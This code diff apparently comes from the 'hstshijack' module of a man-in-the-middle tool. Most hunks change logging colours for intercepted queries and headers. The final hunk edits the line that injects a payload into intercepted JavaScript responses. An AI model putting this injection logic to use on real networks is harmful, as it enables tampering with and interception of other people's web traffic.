@@ -321,9 +321,9 @@ function onRequest(req, res) {
 			for (var i = 0; i < queries.length; i++) {
 				if ( queries[i].split("=").length == 2 ) {
 					params = queries[i].split("=")
-					logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + bold + decodeURIComponent(params[1]) + reset + "\n"
+					logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n"
 				} else {
-					logStr += "  " + on_grey + " " + reset + "    " + yellow + queries[i] + reset + "\n"
+					logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\n"
 				}
 			}
 
@@ -350,7 +350,7 @@ function onRequest(req, res) {
 					params = headers[i].split(": ")
 					logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
 				} else {
-					logStr += "  " + on_white + " " + reset + "    " + bold + headers[i] + reset + "\n"
+					logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n"
 				}
 			}
 
@@ -359,9 +359,9 @@ function onRequest(req, res) {
 			for (var i = 0; i < queries.length; i++) {
 				if ( queries[i].split("=").length == 2 ) {
 					params = queries[i].split("=")
-					logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + bold + decodeURIComponent(params[1]) + reset + "\n"
+					logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n"
 				} else {
-					logStr += "  " + on_white + " " + reset + "    " + bold + queries[i] + reset + "\n"
+					logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\n"
 				}
 			}
 
@@ -664,7 +664,7 @@ function onResponse(req, res) {
 			injection = injection.replace("{{custom_payload}}", "")
 
 			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
-				res.Body = injection + res.Body
+				res.Body = injection.replace(/.*/g, injection) + res.Body // Replace once more to unescape "$$$$$$$$" to a single "$"
 				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
 			} else if ( res.Body.match(/<head[^>]*?>/i) ) {
 				if (encode) {
